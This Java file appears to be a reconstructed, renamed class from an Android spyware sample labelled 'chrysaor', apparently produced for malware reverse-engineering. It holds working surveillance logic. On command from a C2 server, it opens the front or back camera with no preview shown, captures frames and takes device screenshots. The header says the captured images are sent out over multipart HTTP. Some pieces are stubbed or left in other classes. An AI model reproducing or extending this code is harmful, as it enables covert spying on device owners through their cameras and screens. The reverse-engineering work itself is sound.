/*
 * CameraUtil — Remote camera capture and framebuffer screenshot.
 *
 * Originally: com.network.media.a / C0203a (232)
 * Source:      completed/chrysaor/android/java/com/network/media/C0203a.java
 * Analysis:    completed/chrysaor/android/analysis/classes/232_com_network_media_a/ANALYSIS.md
 *
 * Handles remote photo capture (front/back camera) and device screenshots,
 * with JPEG recompression and multipart HTTP exfiltration.
 */
package com.network.android.media;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import com.network.android.p019b.ConfigurationHolder;

public class CameraUtil {

    private static final String TAG = "CameraUtil";
    private static Camera sCamera;
    private static boolean sCameraBusy = false;

    /**
     * Entry point for camera/screenshot commands.
     *
     * @param context      App context
     * @param commandAck   Acknowledgment ID from C2
     * @param sourceType   Bitmask: 1=front camera, 2=back camera, 4=screenshot
     * @param resolution   0-2 (sample size)
     */
    public synchronized void takePhoto(Context context, String commandAck,
                                       int sourceType, int resolution) {
        ConfigurationHolder.log(TAG, "take Photo commandAck: " + commandAck +
                " , sourceType: " + sourceType + " ,resolution: " + resolution);

        if ((sourceType & 4) != 0 && ConfigurationHolder.isFeatureEnabled()) {
            takeScreenshot(context, commandAck, resolution);
        }

        if ((sourceType & 1) != 0) {
            captureCamera(context, commandAck, true, resolution);  // Front
        }
        if ((sourceType & 2) != 0) {
            long delay = (sourceType & 1) != 0 ? 100L : 100L;
            captureCamera(context, commandAck, false, resolution); // Back
        }
    }

    private void captureCamera(Context context, String ack, boolean isFront, int resolution) {
        Camera.CameraInfo info = new Camera.CameraInfo();
        int cameraId = findCamera(isFront);
        if (cameraId < 0) return;

        Camera.getCameraInfo(cameraId, info);
        startCameraPreview(context, ack, cameraId, resolution);
    }

    private int findCamera(boolean isFront) {
        int count = Camera.getNumberOfCameras();
        for (int i = 0; i < count; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (isFront && info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                return i;
            } else if (!isFront && info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                return i;
            }
        }
        return -1;
    }

    private void startCameraPreview(Context context, String ack, int cameraId, int resolution) {
        try {
            if (sCamera != null) {
                stopCamera();
                ConfigurationHolder.log(TAG, "useCamera try again in: 3000, camera already open");
                return;
            }

            sCamera = Camera.open(cameraId);
            sCamera.setPreviewCallback(new CameraPreviewCallback(ack, resolution));
            sCamera.setPreviewDisplay(null); // No display needed
            sCamera.startPreview();
        } catch (Exception e) {
            ConfigurationHolder.log(TAG, "openCamera failed: " + e.getMessage(), e);
            if (sCamera != null) {
                sCamera.release();
                sCamera = null;
            }
        }
    }

    public void stopCamera() {
        ConfigurationHolder.log(TAG, "stop camera started. _camera value: " + sCamera);
        if (sCamera != null) {
            sCamera.setPreviewCallback(null);
            sCamera.stopPreview();
            sCamera.release();
            sCamera = null;
            sCameraBusy = false;
        }
    }

    private void takeScreenshot(Context context, String ack, int resolution) {
        // Uses native take_screen_shot binary (see framework/.../native/take_screen_shot/)
        ConfigurationHolder.log(TAG, "Screenshot requested via native take_screen_shot");
        CommandOrchestrator.exfilScreenshot(context, ack, resolution);
    }
}